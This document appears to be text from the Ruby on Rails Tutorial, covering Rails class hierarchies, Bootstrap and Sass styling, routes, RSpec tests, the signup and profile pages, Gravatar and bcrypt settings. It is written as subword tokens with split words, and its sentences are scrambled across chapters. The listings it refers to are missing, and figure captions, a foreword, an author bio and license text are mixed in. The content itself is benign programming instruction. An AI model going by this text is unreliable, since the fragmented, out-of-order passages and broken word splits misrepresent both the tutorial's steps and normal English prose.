▁We ▁end ▁our ▁discussion ▁of ▁the ▁ demo ▁application ▁with ▁a ▁brief ▁description ▁of ▁the ▁controller ▁and ▁model ▁class ▁ hierarchies ▁in ▁Rails .
▁The ▁\ k ode { User } ▁class , ▁with ▁inheritance .
▁The ▁\ k ode { Micropost } ▁class , ▁with ▁inheritance .
▁ Ex am in ing ▁Listing ~\ ref { code : demo _ application _ controller _ class }, ▁we ▁see ▁that ▁\ k ode { Application Controller } ▁itself ▁inherit s ▁from ▁\ k ode { ActionController :: Base } ; ▁this ▁is ▁the ▁base ▁class ▁for ▁controllers ▁provided ▁by ▁the ▁Rails ▁library ▁Action ▁Pack .
▁The ▁\ k ode { UsersController } ▁class , ▁with ▁inheritance .
▁The ▁\ k ode { Micropost sController } ▁class , ▁with ▁inheritance .
▁The ▁\ k ode { Application Controller } ▁class , ▁with ▁inheritance .
▁As ▁with ▁model ▁inheritance , ▁by ▁inherit ing ▁ ultimate ly ▁from ▁\ k ode { ActionController :: Base } ▁both ▁the ▁Users ▁and ▁Microposts ▁controllers ▁gain ▁a ▁large ▁amount ▁of ▁functionality , ▁such ▁as ▁the ▁ability ▁to ▁manipulate ▁model ▁objects , ▁filter ▁in b ound ▁HTTP ▁requests , ▁and ▁render ▁views ▁as ▁HTML .
▁With ▁the ▁com p let ion ▁of ▁the ▁Microposts ▁resource , ▁now ▁is ▁a ▁good ▁time ▁to ▁push ▁the ▁repository ▁up ▁to ▁GitHub :
▁This ▁update s ▁the ▁database ▁at ▁Heroku ▁with ▁the ▁necessary ▁user / micropost ▁data ▁model .
▁We ' ve ▁come ▁now ▁to ▁the ▁end ▁of ▁the ▁30 , 000 - foo t ▁view ▁of ▁a ▁Rails ▁application .
▁The ▁ demo ▁app ▁ developed ▁in ▁this ▁chapter ▁has ▁sever al ▁ strength s ▁and ▁a ▁host ▁of ▁we a k n es s es .
▁No ▁static ▁pages ▁( like ▁`` Home '' ▁or ▁`` About '')
▁No ▁sign ing ▁in
▁No ▁test - driven ▁development
▁In ▁this ▁chapter , ▁we ' ll ▁change ▁this ▁by ▁in c or p or at ing ▁the ▁\ emph { Bootstrap } ▁framework ▁into ▁our ▁application , ▁and ▁the n ▁we ' ll ▁add ▁some ▁custom ▁style s ▁of ▁our ▁own
▁The ▁\ emph { Rails ▁Tutorial } ▁is ▁a ▁book ▁on ▁web ▁development , ▁not ▁web ▁design , ▁but ▁it ▁would ▁be ▁ de pre s s ing ▁to ▁work ▁on ▁an ▁application ▁that ▁look s ▁like ▁\ emph { c omplete } ▁c ra p , ▁so ▁in ▁this ▁section ▁we ' ll ▁add ▁some ▁structure ▁to ▁the ▁layout ▁and ▁give ▁it ▁some ▁minimal ▁styling ▁with ▁CSS . ▁In ▁addition ▁to ▁using ▁some ▁custom ▁CSS ▁rules , ▁we ' ll ▁make ▁use ▁of ▁\ href { http :// get bootstrap . com /}{ Bootstrap }, ▁an ▁open - source ▁web ▁design ▁framework ▁from ▁Twitter .
▁In side ▁the ▁\ k ode { header } ▁tag , ▁we ▁see ▁a ▁couple ▁of ▁\ k ode { div } ▁tags :
▁In ▁this ▁case , ▁each ▁\ k ode { div } ▁has ▁a ▁CSS ▁class ▁as ▁well .
▁As ▁with ▁the ▁\ k ode { header } ▁tag ' s ▁classes , ▁these ▁classes ▁have ▁special ▁meaning ▁to ▁Bootstrap .
▁After ▁the ▁ div s , ▁we ▁ en counter ▁some ▁ embedded ▁Ruby :
▁The ▁\ k ode { nav } ▁tag , ▁though ▁form ally ▁unnecessary ▁here , ▁communicat es ▁the ▁purpose ▁of ▁the ▁navigation ▁links .
▁The ▁\ k ode { nav } ▁and ▁\ k ode { pull - right } ▁classes ▁on ▁the ▁\ k ode { ul } ▁tag ▁have ▁special ▁meaning ▁to ▁Bootstrap .
▁On ce ▁Rails ▁has ▁processed ▁this ▁layout ▁and ▁evaluated ▁the ▁ embedded ▁Ruby , ▁the ▁list ▁look s ▁like ▁this :
▁As ▁we ▁ learned ▁in ▁Section ~\ ref { sec : layouts }, ▁the ▁\ k ode { yield } ▁method ▁insert s ▁the ▁contents ▁of ▁each ▁page ▁into ▁the ▁site ▁layout .
▁To ▁take ▁advantage ▁of ▁the ▁up com ing ▁style ▁elements , ▁we ' ll ▁add ▁some ▁extra ▁elements ▁to < n > the ▁\ k ode { home . html . erb } ▁view ▁( Listing ~\ ref { code : signup _ button }).
▁( You ▁may ▁also ▁have ▁to ▁create ▁that ▁directory ▁as ▁well , ▁either ▁with ▁\ k ode { mkdir } ▁or ▁with ▁a ▁gra ph ical ▁file ▁ manager .)
▁It ▁is ▁also ▁possible ▁to ▁use ▁ LE SS ▁with ▁the ▁asset ▁pipeline ; ▁see ▁the ▁\ href { http :// rubygems . org / gem s / less - rails - bootstrap }{\ text tt { less - rails - bootstrap } ▁gem } ▁for ▁details .
▁Then ▁restart ▁the ▁web ▁server ▁to ▁incorporate ▁the ▁changes ▁into ▁the ▁development ▁application .
▁( O n ▁most ▁systems , ▁restart ing ▁the ▁server ▁will ▁involve ▁press ing ▁\ text tt { Ctrl - C } ▁and ▁the n ▁running ▁\ k ode { rails ▁server }. )
▁The ▁first ▁step ▁in ▁adding ▁custom ▁CSS ▁to ▁our ▁application ▁is ▁to ▁open ▁a ▁file ▁to ▁contain ▁it :
▁app / assets / stylesheets
▁as ▁show n ▁in ▁Listing ~\ ref { code : bootstrap _ css }.
▁( You ▁may ▁have ▁to ▁use ▁\ text tt { Ctrl - C } ▁restart ▁the ▁local ▁web ▁server .
▁It ' s ▁also ▁worth ▁noting ▁that ▁the ▁screen s h o t s ▁use ▁Bootstrap ~ 2 . 0, ▁whereas ▁the ▁tutorial ▁current ly ▁uses ▁Bootstrap ~ 2 . 3 , ▁so ▁there ▁may ▁be ▁minor ▁difference s ▁in ▁appearance .
▁These ▁are ▁not ▁cause ▁for ▁concern .)
▁( Because ▁the ▁default ▁ navbar ▁color ▁changed ▁between ▁Bo o str ap ▁2 . 0 ▁and ▁2 . 1, ▁we ▁need ▁the ▁\ k ode { navbar - inverse } ▁class ▁to ▁make ▁it ▁d ar k ▁instead ▁of ▁light .)
▁in ▁Listing ~\ ref { code : stylesheets _ partial }.
▁File s ▁in ▁these ▁directories ▁are ▁( even ▁post - 3 . 0 ) ▁automatically ▁served ▁up ▁via ▁requests ▁to ▁ http :// example . com / stylesheets , ▁etc .
▁Start ing ▁in ▁Rails ▁3.1 , ▁and ▁continu ing ▁in ▁Rails ~ 4 , ▁there ▁are ▁\ emph { th re e } ▁canonical ▁directories ▁for ▁static ▁assets , ▁each ▁with ▁its ▁own ▁purpose :
▁images ▁ javascripts ▁stylesheets
▁ Welcome ▁to ▁the ▁\ href { http :// ruby . railstutorial . org / ruby - on - rails - tutorial - book }{\ emph { Ruby ▁on ▁Rails ▁Tutorial } }.
▁We ▁first ▁covered ▁ERb ▁in ▁Section ~\ ref { sec : embedded _ ruby }, ▁and ▁cover ▁Sass ▁in ▁Section ~\ ref { sec : sass }.
▁Every one ▁from ▁ sc r app y ▁start up s ▁to ▁ huge ▁com p an ies ▁have ▁used ▁Rails : ▁\ href { http :// 37 sign al s . com /}{ 37 sign al s }, ▁\ href { http :// github . com /}{ GitHub }, ▁\ href { http :// s h o p ify . com /}{ S h o p ify }, ▁\ href { http :// sc r i b d . com /}{ S c r i b d }, ▁\ href { http :// twitter . com /}{ T w it ter }, ▁\ href { http :// d is n e y . com /}{ D is n e y }, ▁\ href { http :// h ul u . com /}{ H ul u }, ▁the ▁\ href { http :// y el low pages . com /}{ Y el low ▁Pages }--- the ▁\ href { http :// rubyonrails . org / application s }{ list ▁of ▁site s ▁using ▁Rails } ▁go es ▁on ▁and ▁on .
▁Inde ed , ▁the ▁Bootstrap ▁framework ▁defines ▁a ▁large ▁number ▁of ▁variables ▁for ▁color s , ▁available ▁online ▁on ▁the ▁\ href { http :// bootstrap doc s . com / v 2 . 0 . 4 / doc s / less . html }{ Bootstrap ▁page ▁of ▁ LE SS ▁variables }.
▁That ▁page ▁defines ▁variables ▁using ▁ LE SS , ▁not ▁Sass , ▁but ▁the ▁\ text tt { bootstrap - sass } ▁gem ▁provides ▁the ▁Sass ▁equivalent s .
▁\ href { http :// p eep code . com /}{ PeepCode } : ▁ Ex ce ll ent ▁com m er cial ▁screencasts
▁\ href { http :// www . code school . com /}{ C ode ▁School } : ▁In ter active ▁programming ▁course s
▁but ▁that ▁is n ' t ▁the ▁Rails ▁Way .
▁\ href { http :// r ailscasts . com /}{ RailsCast s } ▁by ▁ Ryan ▁B ate s : ▁D id ▁I ▁already ▁ ment ion ▁\ href { http :// r ailscasts . com /}{ RailsCast s } ?
▁ Seri ous ly : ▁\ href { http :// r ailscasts . com / }{\ emph { RailsCast s } }.
▁The ▁test ▁appears ▁as ▁in ▁Listing ~\ ref { code : contact _ page _ test }, ▁which ▁simply ▁follows ▁the ▁model ▁last ▁seen ▁in ▁Listing ~\ ref { code : pages _ controller _ spec _ title }.
▁Tests ▁for ▁a ▁Contact ▁page .
▁Now ▁that ▁we ▁have ▁tests ▁for ▁the ▁URLs ▁we ▁want , ▁it ' s ▁time ▁to ▁get ▁them ▁to ▁work .
▁If ▁you ▁take ▁a ▁look ▁at ▁the ▁default ▁routes ▁file , ▁you ' ll ▁see ▁that ▁it ' s ▁quite ▁a ▁me s s , ▁but ▁it ' s ▁a ▁useful ▁me s s --- full ▁of ▁comment ed - out ▁example ▁route ▁mapping s .
▁I ▁suggest ▁reading ▁through ▁it ▁at ▁some ▁point , ▁and ▁I ▁also ▁suggest ▁tak ing ▁a ▁look ▁at ▁the ▁\ href { http :// guides . rubyonrails . org / routing . html }{ Rails ▁G u id es ▁article ▁`` Rails ▁ Routing ▁from ▁the ▁outside ▁in '' } ▁for ▁a ▁much ▁more ▁in - de p th ▁treat ment ▁of ▁routes .
▁To ▁define ▁the ▁named ▁routes , ▁we ▁need ▁to ▁replace ▁rules ▁such ▁as
▁This ▁arrange s ▁both ▁for ▁a ▁valid ▁page ▁at ▁\ k ode { / help } ▁( respond ing ▁to ▁\ text tt { GET } ▁requests ) ▁and ▁a ▁named ▁route ▁called ▁\ k ode { help \_ path } ▁that ▁returns ▁the ▁path ▁to ▁that ▁page .
▁( Actually , ▁using ▁\ k ode { get } ▁in ▁place ▁of ▁\ k ode { match } ▁gives ▁the ▁same ▁named ▁routes , ▁but ▁using ▁\ k ode { match } ▁is ▁more ▁conventional .)
▁in ▁Listing ~\ ref { code : root _ route }.
▁Before , ▁this ▁was ▁more ▁explicit : ▁we ▁used
▁to ▁get ▁to ▁the ▁same ▁place , ▁but ▁\ k ode { / about } ▁is ▁more ▁succinct .
▁In ▁addition , ▁as ▁mentioned ▁above , ▁the ▁code ▁\ k ode { match ▁' / about ' } ▁also ▁automatically ▁creates ▁\ emph { name d ▁routes } ▁for ▁use ▁in ▁the ▁controllers ▁and ▁views :
▁In ▁the ▁\ emph { Rails ▁Tutorial }, ▁we ' ll ▁follow ▁the ▁common ▁convention ▁of ▁using ▁the ▁\ k ode { path } ▁form ▁except ▁when ▁doing ▁redirect s , ▁where ▁we ' ll ▁use ▁the ▁\ k ode { url } ▁form .
▁This ▁is ▁because ▁after ▁redirect s ▁the ▁HTTP ▁standard ▁technical ly ▁requires ▁a ▁full ▁URL , ▁although ▁in ▁most ▁browsers ▁it ▁will ▁work ▁either ▁way .
▁If ▁you ▁don ' t ▁already ▁have ▁it , ▁you ▁should ▁\ href { http :// ruby for ge . org / f r s / ? group _ id = 12 6 }{ download ▁RubyGems }, ▁extract ▁it , ▁and ▁the n ▁go ▁to ▁the ▁\ k ode { rubygems } ▁directory ▁and ▁run ▁the ▁setup ▁program :
▁With ▁these ▁routes ▁now ▁defined , ▁the ▁tests ▁for ▁the ▁Help , ▁About , ▁and ▁Contact ▁pages ▁should ▁pass :
▁This ▁leave s ▁the ▁test ▁for ▁the ▁Home ▁page ▁as ▁the ▁last ▁one ▁to ▁fail .
▁To ▁establish ▁the ▁route ▁mapping ▁for ▁the ▁Home ▁page , ▁we ▁\ emph { co ul d } ▁use ▁code ▁like ▁this :
▁The ▁comment ed - out ▁hint ▁for ▁defin ing ▁the ▁root ▁route .
▁I ▁a m ▁current ly ▁working ▁with ▁ Engine ▁ Y ar d ▁to ▁create ▁links ▁to ▁specific ▁versions ▁of ▁the ▁Rails ▁Installer .
▁It ▁also ▁gives ▁us ▁URL ▁helpers ▁as ▁follows :
▁With ▁that , ▁all ▁of ▁the ▁routes ▁for ▁static ▁pages ▁are ▁working , ▁and ▁the ▁tests ▁should ▁pass :
▁Now ▁we ▁just ▁have ▁to ▁fill ▁in ▁the ▁links ▁in ▁the ▁layout .
▁This ▁will ▁ ent a il ▁ filling ▁in ▁the ▁second ▁arguments ▁of ▁the ▁\ k ode { link \_ to } ▁functions ▁with ▁the ▁proper ▁named ▁routes .
▁By ▁the ▁way , ▁it ' s ▁worth ▁noting ▁that , ▁although ▁we ▁have n ' t ▁actually ▁test ed ▁for ▁the ▁presence ▁of ▁the ▁links ▁on ▁the ▁layout , ▁our ▁tests ▁will ▁fail ▁if ▁the ▁routes ▁are n ' t ▁defined .
▁in ▁Listing ~\ ref { code : static _ page _ routes } ▁and
▁The ▁About ▁page ▁at ▁\ href { http :// localhost :3000/ about }{/ about }.
▁A ▁configuration ▁file ▁for ▁\ href { http :// rack . ruby for ge . org / doc /}{ Rack ▁middleware }
▁route ▁get ▁" users / new "
▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ pages _ spec }.
▁The ▁initial ▁spec ▁for ▁users , ▁with ▁a ▁test ▁for ▁the ▁signup ▁page .
▁We ▁can ▁run ▁these ▁tests ▁using ▁the ▁\ k ode { rspec } ▁command ▁as ▁usual :
▁It ' s ▁worth ▁noting ▁that ▁we ▁can ▁also ▁run ▁all ▁the ▁request ▁spec s ▁by ▁passing ▁the ▁whole ▁directory ▁instead ▁of ▁just ▁one ▁file :
▁ Base d ▁on ▁this ▁pattern , ▁you ▁may ▁be ▁able ▁to ▁guess ▁how ▁to ▁run ▁\ emph { all } ▁the ▁spec s :
▁For ▁completeness , ▁we ' ll ▁usually ▁use ▁this ▁method ▁to ▁run ▁the ▁tests ▁through ▁the ▁rest ▁of ▁the ▁tutorial .
▁By ▁the ▁way , ▁it ' s ▁worth ▁noting ▁( since ▁you ▁may ▁see ▁other ▁people ▁use ▁it ) ▁that ▁you ▁can ▁also ▁run ▁the ▁test ▁suite ▁using ▁the ▁\ k ode { spec } ▁Rake ▁task :
▁( In ▁fact , ▁you ▁can ▁just ▁type ▁\ k ode { rake } ▁by ▁itself ; ▁the ▁default ▁behavior ▁of ▁\ k ode { rake } ▁is ▁to ▁run ▁the ▁test ▁suite .)
▁By ▁construction , ▁the ▁Users ▁controller ▁already ▁has ▁a ▁\ k ode { new } ▁action , ▁so ▁to ▁get ▁the ▁test ▁to ▁pass ▁all ▁we ▁need ▁is ▁the ▁right ▁route ▁and ▁the ▁right ▁view ▁content .
▁in ▁Listing ~\ ref { code : generate _ users _ controller }.
▁All ▁that ' s ▁left ▁is ▁to ▁add ▁the ▁proper ▁link ▁to ▁the ▁button ▁on ▁the ▁Home ▁page .
▁in ▁Listing ~\ ref { code : home _ page _ signup _ link }.
▁At ▁this ▁point , ▁if ▁you ▁are ▁using ▁Git ▁you ▁should ▁merge ▁the ▁changes ▁back ▁into ▁the ▁master ▁branch :
▁The ▁result ▁should ▁be ▁a ▁working ▁sample ▁application ▁on ▁the ▁production ▁server :
▁A ▁mockup ▁of ▁the ▁sample ▁application ' s ▁Home ▁page . ~\ href { http :// railstutorial . org / images / figures / home _ page _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁But ▁a ▁ craft s ma n ▁has ▁to ▁know ▁his ▁tool s , ▁and ▁in ▁the ▁end ▁the ▁re w ar d ▁is ▁worth ▁the ▁effort .
▁The ▁directory ▁structure ▁for ▁a ▁new ly ▁created ▁Rails ▁app . ~\ href { http :// railstutorial . org / images / figures / directory _ structure _ rails _4_0 - full . png }{ ( full ▁size )}
▁The ▁Home ▁page ▁(\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home }) ▁with ▁no ▁custom ▁CSS . ~\ href { http :// railstutorial . org / images / figures / layout _ no _ logo _ or _ custom _ css _ bootstrap _ rails _ 4 - full . png }{ ( full ▁size )}
▁The ▁sample ▁application ▁with ▁Bootstrap ▁CSS . ~\ href { http :// railstutorial . org / images / figures / sample _ app _ only _ bootstrap _4_0 - full . png }{ ( full ▁size )}
▁ Adding ▁some ▁ spacing ▁and ▁other ▁ universal ▁styling . ~\ href { http :// railstutorial . org / images / figures / sample _ app _ universal _4_0 - full . png }{ ( full ▁size )}
▁ Adding ▁some ▁t y p ographic ▁styling . ~\ href { http :// railstutorial . org / images / figures / sample _ app _ typography _4_0 - full . png }{ ( full ▁size )}
▁The ▁default ▁Rails ▁page . ~\ href { http :// railstutorial . org / images / figures / riding _ rails _4_0 - full . png }{ ( full ▁size )}
▁The ▁default ▁page ▁with ▁the ▁app ▁environment . ~\ href { http :// railstutorial . org / images / figures / riding _ rails _ environment _4_0 - full . png }{ ( full ▁size )}
▁The ▁sample ▁app ▁with ▁nicely ▁style d ▁ logo . ~\ href { http :// railstutorial . org / images / figures / sample _ app _ logo _4_0 - full . png }{ ( full ▁size )}
▁Creat ing ▁the ▁first ▁app ▁repository ▁at ▁GitHub . ~\ href { http :// railstutorial . org / images / figures / create _ first _ repository _4_0 - full . png }{ ( full ▁size )}
▁The ▁Home ▁page ▁(\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home }) ▁with ▁an ▁added ▁ footer . ~\ href { http :// railstutorial . org / images / figures / site _ with _ footer _ bootstrap _4_0 - full . png }{ ( full ▁size )}
▁The ▁structure ▁of ▁this ▁section ▁is ▁base d ▁on ▁the ▁excellent ▁blog ▁post ▁\ href { http :// 2 be ar d s . net / 2011 / 11 / the - rails - 3- asset - pipeline - in - about - 5 - minute s /}{ The ▁Rails ▁3 ▁ Asset ▁Pipeline ▁in ▁( about ) ▁5 ▁M in ute s } ▁by ▁ Michael ▁E ra s m us .
▁A ▁GitHub ▁repository ▁page . ~\ href { http :// railstutorial . org / images / figures / github _ repository _ page _4_0 - full . png }{ ( full ▁size )}
▁The ▁initial ▁\ k ode { README } ▁file ▁for ▁our ▁project ▁at ▁GitHub . ~\ href { http :// railstutorial . org / images / figures / rails _ readme _4_0 - full . png }{ ( full ▁size )}
▁The ▁improve d ▁\ k ode { README } ▁file ▁ formatted ▁with ▁ Markdown . ~\ href { http :// railstutorial . org / images / figures / new _ readme _4_0 - full . png }{ ( full ▁size )}
▁The ▁first ▁Rails ▁Tutorial ▁application ▁running ▁on ▁Heroku . ~\ href { http :// railstutorial . org / images / figures / heroku _ app _4_0 - full . png }{ ( full ▁size )}
▁The ▁be a u t i ful ▁interface ▁at ▁Heroku . ~\ href { http :// railstutorial . org / images / figures / heroku _ info _4_0 - full . png }{ ( full ▁size )}
▁The ▁About ▁page ▁at ▁\ href { http :// localhost :3000/ about }{/ about }. ~\ href { http :// railstutorial . org / images / figures / about _ page _ style d - full . png }{ ( full ▁size )}
▁The ▁new ▁signup ▁page ▁at ▁\ href { http :// localhost :3000/ signup }{/ signup }. ~\ href { http :// railstutorial . org / images / figures / new _ signup _ page _ bootstrap - full . png }{ ( full ▁size )}
▁For e word
▁Person ally , ▁I ▁power ed ▁through ▁the ▁\ emph { Rails ▁Tutorial } ▁in ▁three ▁long ▁days , ▁doing ▁all ▁the ▁examples ▁and ▁ cha ll en ge s ▁at ▁the ▁end ▁of ▁each ▁chapter .
▁A c knowledg ment s
▁About ▁the ▁author
▁\ href { http :// michael hartl . com /}{ Michael ▁Hartl } ▁is ▁the ▁author ▁of ▁the ▁\ href { http :// ruby . railstutorial . org / }{\ emph { Ruby ▁on ▁Rails ▁Tutorial } }, ▁the ▁leading ▁introduction ▁to ▁web ▁development ▁with ▁\ href { http :// rubyonrails . org /}{ Ruby ▁on ▁Rails }.
▁Co p y right ▁and ▁ license
▁Co p y right ▁( c ) ▁20 1 3 ▁ Michael ▁Hartl
▁P er m is s ion ▁is ▁here by ▁gra n t ed , ▁free ▁of ▁charge , ▁to ▁any ▁person ▁obtain ing ▁a ▁copy
▁of ▁this ▁software ▁and ▁ associated ▁documentation ▁files ▁( the ▁" Software ") , ▁to ▁deal
▁in ▁the ▁ Software ▁without ▁restrict ion , ▁including ▁without ▁limit ation ▁the ▁right s
▁to ▁use , ▁copy , ▁modify , ▁merge , ▁p u b li s h , ▁d ist r i but e , ▁sub license , ▁and / or ▁ se ll
▁copie s ▁of ▁the ▁ Software , ▁and ▁to ▁ permit ▁person s ▁to ▁who m ▁the ▁ Software ▁is
▁f ur n is h ed ▁to ▁do ▁so , ▁subject ▁to ▁the ▁following ▁conditions :
▁The ▁above ▁copy right ▁notice ▁and ▁this ▁ permission ▁notice ▁shall ▁be ▁included ▁in
▁all ▁copie s ▁or ▁substan tial ▁ port ion s ▁of ▁the ▁ Software .
▁< n > ▁* ▁" THE ▁B E ER - W A RE ▁L I C E N S E " ▁( R evi s ion ▁42 ) :
▁< n > ▁* ▁ Michael ▁Hartl ▁wrote ▁this ▁code .
▁As ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : signup _ success }, ▁the ▁key ▁to ▁creating ▁a ▁user ▁is ▁the ▁special ▁\ k ode { name } ▁attribute ▁in ▁each ▁\ k ode { input } :
▁These ▁\ k ode { name } ▁values ▁allow ▁Rails ▁to ▁construct ▁an ▁initialization ▁hash ▁( via ▁the ▁\ k ode { params } ▁variable ) ▁for ▁creating ▁users ▁using ▁the ▁values ▁entered ▁by ▁the ▁user , ▁as ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : signup _ failure }.
▁We ' ll ▁fix ▁the ▁first ▁issue ▁in ▁Section ~\ ref { sec : signup _ error _ messages } ▁and ▁the ▁second ▁in ▁Section ~\ ref { sec : signup _ success }.
▁If ▁it ▁fails , ▁we ▁simply ▁f all ▁back ▁on ▁the ▁behavior ▁ developed ▁in ▁Section ~\ ref { sec : signup _ failure }.
▁Now ▁that ▁we ▁have ▁a ▁working ▁User ▁model , ▁it ' s ▁time ▁to ▁add ▁an ▁ability ▁few ▁website s ▁can ▁live ▁without : ▁let ting ▁users ▁sign ▁up ▁for ▁the ▁site .
▁As ▁usual , ▁we ' ll ▁write ▁tests ▁as ▁we ▁develop , ▁extend ing ▁the ▁the me ▁of ▁using ▁RSpec ▁and ▁Capybara ▁to ▁write ▁succinct ▁and ▁express ive ▁integration ▁tests .
▁If ▁you ▁skip ped ▁that ▁section , ▁you ▁should ▁go ▁there ▁now ▁and ▁complete ▁it ▁before ▁proceeding .
▁A ▁mockup ▁of ▁the ▁user ▁profile ▁made ▁in ▁this ▁section . ~\ href { http :// railstutorial . org / images / figures / profile _ mockup _ profile _ name _ bootstrap - full . png }{ ( full ▁size )}
▁A ▁mockup ▁of ▁our ▁best ▁guess ▁at ▁the ▁final ▁profile ▁page . ~\ href { http :// railstutorial . org / images / figures / profile _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁sample ▁application ▁Home ▁page ▁(\ href { http :// localhost :3000/ }{/ }) ▁with ▁debug ▁information . ~\ href { http :// railstutorial . org / images / figures / home _ page _ with _ debug _4_0 - full . png }{ ( full ▁size )}
▁In ▁particular , ▁\ k ode { Rails . env . development ?}\ ▁is ▁\ k ode { true } ▁only ▁in ▁a ▁development ▁environment , ▁so ▁the ▁ Embedded ▁Ruby
▁The ▁error ▁page ▁for ▁/ users /1 . ~\ href { http :// railstutorial . org / images / figures / profile _ routing _ error - full . png }{ ( full ▁size )}
▁We ▁can ▁get ▁the ▁REST - style ▁URL ▁to ▁work ▁by ▁adding ▁a ▁single ▁line ▁to ▁our ▁routes ▁file ▁(\ k ode { config / routes . rb }) :
▁in ▁Listing ~\ ref { code : signup _ route }.
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : users _ resource }, ▁the ▁routing ▁works , ▁but ▁there ' s ▁ still ▁no ▁page ▁there ▁( F igure ~\ ref { fig : user _ show _ unknown _ action _ 4 }).
▁The ▁URL ▁/ users /1 ▁with ▁routing ▁but ▁no ▁page . ~\ href { http :// railstutorial . org / images / figures / user _ show _ unknown _ action _ 4 - full . png }{ ( full ▁size )}
▁This ▁view ▁uses ▁ Embedded ▁Ruby ▁to ▁display ▁the ▁user ' s ▁name ▁and ▁email ▁address , ▁as sum ing ▁the ▁exist ence ▁of ▁an ▁instance ▁variable ▁called ▁\ k ode {@ user }.
▁Of ▁course , ▁eventual ly ▁the ▁real ▁user ▁show ▁page ▁will ▁look ▁very ▁different , ▁and ▁won ' t ▁display ▁the ▁email ▁address ▁public ly .
▁Note ▁that ▁the ▁debug ▁information ▁in ▁F igure ~\ ref { fig : user _ show _ rails _3} ▁confirm s ▁the ▁value ▁of ▁\ k ode { params [: id ]} :
▁The ▁user ▁show ▁page ▁at ▁\ href { http :// localhost :3000/ users /1}{ / users /1 } ▁after ▁adding ▁a ▁Users ▁resource . ~\ href { http :// railstutorial . org / images / figures / user _ show _ bootstrap - full . png }{ ( full ▁size )}
▁One ▁thing ▁you ▁will ▁quickly ▁notice ▁when ▁running ▁tests ▁with ▁ Factory ▁Girl ▁is ▁that ▁they ▁are ▁\ emph { s low }.
▁The ▁reason ▁is ▁not ▁ Factory ▁Girl ' s ▁ fa ul t , ▁and ▁in ▁fact ▁it ▁is ▁a ▁\ emph { feature }, ▁not ▁a ▁bug .
▁U nfortunately , ▁this ▁means ▁that ▁creating ▁users ▁can ▁b o g ▁down ▁the ▁test ▁suite ; ▁h appily , ▁there ▁is ▁an ▁easy ▁fix .
▁The ▁\ text tt { bcrypt - ruby } ▁library ▁uses ▁a ▁\ emph { co st ▁factor } ▁to ▁control ▁how ▁com put ation ally ▁co st ly ▁it ▁is ▁to ▁create ▁the ▁secure ▁hash .
▁The ▁default ▁value ▁is ▁design ed ▁for ▁security , ▁not ▁for ▁speed , ▁which ▁is ▁ perfect ▁for ▁production ▁applications , ▁but ▁in ▁tests ▁our ▁needs ▁are ▁reverse d : ▁we ▁want ▁\ emph { fa st } ▁tests , ▁and ▁don ' t ▁care ▁at ▁all ▁about ▁the ▁security ▁of ▁the ▁test ▁users ' ▁password ▁hashes .
▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ bcrypt _ co st _ factor }.
▁# ▁S p e ed ▁up ▁tests ▁by ▁lower ing ▁bcrypt ' s ▁co st ▁function .
▁When ▁making ▁views , ▁we ' ll ▁focus ▁on ▁the ▁ visual ▁appearance ▁and ▁not ▁worry ▁too ▁much ▁about ▁the ▁exact ▁structure ▁of ▁the ▁page , ▁which ▁means ▁that ▁( at ▁least ▁for ▁now ) ▁we ▁won ' t ▁be ▁writing ▁tests .
▁But ▁you ' ve ▁seen ▁the ▁\ href { http :// www . i m db . com / title / tt 04 99 5 4 9 /}{ m o v i e }, ▁so ▁you ▁already ▁ k new ▁this .
▁Or ig inally ▁created ▁by ▁To m ▁P re s to n - We r n er ▁( c of ound er ▁of ▁\ href { http :// github . com /}{ GitHub }) ▁and ▁later ▁a c q u ir ed ▁and ▁scale d ▁by ▁\ href { http :// auto ma tt ic . com /}{ A u to ma tt ic } ▁( the ▁make r s ▁of ▁\ href { http :// word pre s s . com /}{ Word P re s s }), ▁Gravatar ▁is ▁a ▁free ▁ service ▁that ▁allows ▁users ▁to ▁upload ▁images ▁and ▁associate ▁them ▁with ▁email ▁addresses ▁they ▁control .
▁You ▁can ▁verify ▁at ▁this ▁point ▁that ▁the ▁test ▁suite ▁is ▁failing :
▁Because ▁the ▁\ k ode { gravatar \_ for } ▁method ▁is ▁undefined , ▁the ▁user ▁show ▁view ▁is ▁current ly ▁broken .
▁( C at ch ing ▁errors ▁of ▁this ▁nature ▁is ▁p erhaps ▁the ▁most ▁useful ▁aspect ▁of ▁view ▁spec s .
▁This ▁is ▁why ▁ having ▁\ emph { some } ▁test ▁of ▁the ▁view , ▁even ▁a ▁minimal ist ▁one , ▁is ▁so ▁important .)
▁As ▁\ href { http :// en . gravatar . com / site / implement / hash /}{ not ed ▁at ▁the ▁Gravatar ▁home ▁page }, ▁Gravatar ▁URLs ▁are ▁base d ▁on ▁an ▁\ href { http :// en . wiki p edia . org / wiki / M D 5 }{ M D 5 ▁hash } ▁of ▁the ▁user ' s ▁email ▁address .
▁# ▁Return s ▁the ▁Gravatar ▁( http :// gravatar . com / ) ▁for ▁the ▁given ▁user .
▁You ▁can ▁confirm ▁that ▁the ▁test ▁suite ▁is ▁now ▁passing :
▁The ▁user ▁profile ▁page ▁\ href { http :// localhost :3000/ users /1}{ / users /1 } ▁with ▁the ▁default ▁Gravatar . ~\ href { http :// railstutorial . org / images / figures / profile _ with _ gravatar _ bootstrap _4_0 - full . png }{ ( full ▁size )}
▁The ▁user ▁show ▁page ▁with ▁a ▁custom ▁Gravatar . ~\ href { http :// railstutorial . org / images / figures / profile _ custom _ gravatar _ bootstrap _4_0 - full . png }{ ( full ▁size )}
▁We ▁include ▁\ k ode { row } ▁and ▁\ k ode { span 4 } ▁classes , ▁which ▁are ▁both ▁part ▁of ▁Bootstrap .
▁The ▁user ▁show ▁page ▁\ href { http :// localhost :3000/ users /1}{ / users /1 } ▁with ▁a ▁sidebar ▁and ▁CSS . ~\ href { http :// railstutorial . org / images / figures / user _ show _ side bar _ css _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁current ▁state ▁of ▁the ▁signup ▁page ▁\ href { http :// localhost :3000/ signup }{/ signup }. ~\ href { http :// railstutorial . org / images / figures / new _ signup _ page _ bootstrap - full . png }{ ( full ▁size )}
